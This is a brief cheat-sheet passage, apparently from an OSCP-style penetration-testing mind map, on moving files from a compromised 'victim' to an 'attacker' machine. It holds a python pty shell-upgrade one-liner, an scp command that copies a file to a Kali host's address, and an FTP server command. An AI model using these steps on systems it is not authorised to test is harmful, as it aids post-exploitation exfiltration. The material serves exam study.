https://github.com/eMVee-NL/MindMap
### Victim To Attacker

#### SCP

TTY shell first

```
python -c 'import pty; pty.spawn("/bin/sh")'
```

```bash
scp ~/localfile.txt kali@192.168.45.156:/home/kali/oscp/linux_tools/linpeas.sh
```

#### FTP

```bash
sudo twistd3 -n ftp -p 21 -r /oscp 
```
